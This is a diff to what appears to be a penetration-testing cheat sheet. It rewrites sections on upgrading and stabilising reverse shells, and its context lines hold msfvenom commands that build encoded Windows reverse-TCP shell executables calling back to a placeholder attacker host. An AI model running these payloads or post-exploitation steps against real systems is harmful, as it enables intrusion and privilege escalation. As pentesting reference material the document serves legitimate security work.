@@ -285,7 +285,14 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT
 msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
 ```
 
-#### (Optional) TTY
+### (Optional) TTY
+
+ A TTY is a particular kind of device file which implements a number of
+additional commands beyond read and write.
+
+A TTY shell may be needed for an exploit to work and is required to make use of
+`sudo`. It is recommended to upgrade any shell obtained to TTY before
+attempting privileges escalation techniques.
 
 ```
 /bin/sh -i
@@ -312,13 +319,32 @@ exec "/bin/sh"
 !sh
 ```
 
-#### (Optional) Auto-completion and commands history
+### (Optional) Auto-completion and commands history
 
-  - Set host terminal to raw with echo unset:
-  `*ctrl-z* stty raw -echo`
-  - If TERM environment variable is not set on target shell:
-  `*ctrl+z* echo $TERM`
-  `*fg* export TERM=<TERM>`
+  - Background the reverse shell terminal using `Ctrl+Z`
+  - Set host terminal to raw with echo unset: `stty raw -echo`
+  - Foreground the reverse shell terminal `fg` and re-initialize it using
+    `reset`
+
+If the TERM environment variable is not set on the reverse shell:
+
+```
+ctrl+z
+echo $TERM
+fg
+export TERM=<TERM>
+```
+
+Lastly, the shell might not be of the correct height or width. To update the
+shell height / width to correspond to the terminal size use:
+
+```
+ctrl+z
+stty size
+-> <ROWS> <COLUMNS>
+fg
+stty -rows <ROWS> -columns <COLUMNS>
+```
 
 ### Meterpreter
 
